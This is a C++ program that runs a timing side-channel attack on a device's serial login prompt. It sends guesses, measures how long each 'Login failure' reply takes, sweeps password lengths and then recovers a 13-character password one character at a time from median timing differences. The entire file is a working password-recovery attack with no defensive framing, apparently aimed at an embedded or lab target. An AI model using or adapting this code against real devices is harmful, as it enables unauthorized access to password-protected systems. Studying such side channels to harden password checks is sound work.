#include <algorithm>
#include <chrono>
#include <fstream>
#include <iostream>
#include <random>
#include <sstream>
#include <string>
#include <thread>
#include <utility>
#include <vector>

#include "serial/include/serial/serial.h"

using Clock = std::chrono::steady_clock;

struct CandidateResult {
    std::string candidate;
    Clock::duration median_delta;
};

Clock::duration median(std::vector<Clock::duration> samples) {
    std::sort(samples.begin(), samples.end());
    const std::size_t middle = samples.size() / 2;
    if (samples.size() % 2 != 0) {
        return samples[middle];
    }
    return (samples[middle - 1] + samples[middle]) / 2;
}

bool readUntilPrompt(serial::Serial& device, std::string& received) {
    received.clear();
    while (received.find("password") == std::string::npos) {
        const std::string byte = device.read(1);
        if (byte.empty()) {
            return false;
        }
        received += byte;
    }
    return true;
}

bool measureAttempt(serial::Serial& device, const std::string& payload,
                    Clock::duration& elapsed) {
    std::string prompt;
    if (!readUntilPrompt(device, prompt)) {
        std::cerr << "Did not receive the password prompt. Received: "
                  << prompt << '\n';
        return false;
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(20));

    const auto begin = Clock::now();
    device.write(payload + '\n');

    std::string response;
    do {
        response = device.readline();
        if (response.empty()) {
            std::cerr << "Timed out waiting for the login response for "
                      << payload << ".\n";
            return false;
        }
    } while (response.find("Login failure") == std::string::npos);

    elapsed = Clock::now() - begin;
    return true;
}

bool measureCandidate(serial::Serial& device,
                      const std::string& baseline,
                      const std::string& candidate,
                      int repetitions,
                      Clock::duration& median_delta,
                      std::ostream& raw_output,
                      std::mt19937& random_engine) {
    std::vector<Clock::duration> deltas;
    deltas.reserve(repetitions);

    for (int attempt = 0; attempt < repetitions; ++attempt) {
        Clock::duration baseline_time;
        Clock::duration candidate_time;
        Clock::duration delta;
        if (random_engine() % 2 == 0) {
            if (!measureAttempt(device, baseline, baseline_time) ||
                !measureAttempt(device, candidate, candidate_time)) {
                return false;
            }
            delta = candidate_time - baseline_time;
        } else {
            if (!measureAttempt(device, candidate, candidate_time) ||
                !measureAttempt(device, baseline, baseline_time)) {
                return false;
            }
            delta = candidate_time - baseline_time;
        }
        deltas.push_back(delta);

        const auto baseline_microseconds =
            std::chrono::duration_cast<std::chrono::microseconds>(
                baseline_time)
                .count();
        const auto candidate_microseconds =
            std::chrono::duration_cast<std::chrono::microseconds>(
                candidate_time)
                .count();
        const auto delta_microseconds =
            std::chrono::duration_cast<std::chrono::microseconds>(delta)
                .count();
        raw_output << "sample," << candidate << ',' << attempt + 1 << ','
                   << baseline_microseconds << ',' << candidate_microseconds
                   << ',' << delta_microseconds << '\n';
    }

    median_delta = median(std::move(deltas));
    return true;
}

void runLengthSweep(serial::Serial& device, std::ostream& output) {
    output << "Length sweep\n";
    std::cout << "Length sweep\n";

    for (int length = 1; length <= 20; ++length) {
        const std::string candidate(length, 'X');
        Clock::duration response_time;
        if (!measureAttempt(device, candidate, response_time)) {
            return;
        }

        const auto microseconds =
            std::chrono::duration_cast<std::chrono::microseconds>(
                response_time)
                .count();
        output << length << " characters (" << candidate << "): "
               << microseconds << " us\n";
        std::cout << length << " characters (" << candidate << "): "
                  << microseconds << " us\n";
    }
}

void runIterativeCharacterSweep(serial::Serial& device,
                                std::ostream& output,
                                int password_length,
                                int repetitions = 20) {
    if (repetitions < 1) {
        std::cerr << "The repetition count must be positive.\n";
        return;
    }

    const std::string baseline(password_length, 'z');
    std::mt19937 random_engine(std::random_device{}());

    std::string known_prefix;
    output << "\nIterative character sweep (" << password_length
           << " characters, " << repetitions << " repetitions)\n";
    output << "Raw samples: type,candidate,attempt,baseline_us,candidate_us,"
              "delta_us\n";

    for (int position = 0; position < password_length; ++position) {
        std::vector<CandidateResult> results;
        results.reserve(26);

        for (char character = 'a'; character <= 'z'; ++character) {
            const std::string candidate =
                known_prefix + character +
                std::string(password_length - position - 1, 'a');
            Clock::duration delta;
            if (!measureCandidate(device, baseline, candidate, repetitions,
                                  delta, output, random_engine)) {
                return;
            }
            results.push_back({candidate, delta});
        }

        const auto best = std::max_element(
            results.begin(), results.end(),
            [](const CandidateResult& left, const CandidateResult& right) {
                return left.median_delta < right.median_delta;
            });
        known_prefix += best->candidate[position];

        output << "Position " << position + 1 << ": " << best->candidate
               << " (" << std::chrono::duration_cast<std::chrono::microseconds>(
                                  best->median_delta)
                                  .count()
               << " us median)\n";
        std::cout << "Position " << position + 1 << ": " << best->candidate
                  << " (" << std::chrono::duration_cast<std::chrono::microseconds>(
                                  best->median_delta)
                                  .count()
                  << " us median)\n";
        for (const auto& result : results) {
            output << "  " << result.candidate << ": "
                   << std::chrono::duration_cast<std::chrono::microseconds>(
                          result.median_delta)
                          .count()
                   << " us median\n";
        }
    }

    output << "Recovered prefix: " << known_prefix << '\n';
    std::cout << "Recovered prefix: " << known_prefix << '\n';
}

bool createResultsFile(std::ofstream& output, std::string& filename) {
    for (unsigned int index = 1;; ++index) {
        std::ostringstream candidate_name;
        candidate_name << "timing_results_" << index << ".txt";
        std::ifstream existing(candidate_name.str());
        if (existing.good()) {
            continue;
        }

        output.open(candidate_name.str());
        if (!output.is_open()) {
            return false;
        }
        filename = candidate_name.str();
        return true;
    }
}

int main() {
    const std::string port = "/dev/ttyUSB0";
    const unsigned long baud = 115200;

    try {
        std::ofstream results_file;
        std::string results_filename;
        if (!createResultsFile(results_file, results_filename)) {
            std::cerr << "Failed to create a results file.\n";
            return 1;
        }
        std::cout << "Writing results to " << results_filename << '\n';

        serial::Serial device(port, baud,
                               serial::Timeout::simpleTimeout(1000));
        if (!device.isOpen()) {
            std::cerr << "Failed to open port.\n";
            return 1;
        }
        std::cout << "Successfully connected to " << port << "!\n";

        device.setDTR(false);
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        device.setDTR(true);
        std::this_thread::sleep_for(std::chrono::milliseconds(2000));

        runLengthSweep(device, results_file);
        runIterativeCharacterSweep(device, results_file, 13);
    } catch (const std::exception& error) {
        std::cerr << "Serial error: " << error.what() << '\n';
        return 1;
    }

    return 0;
}
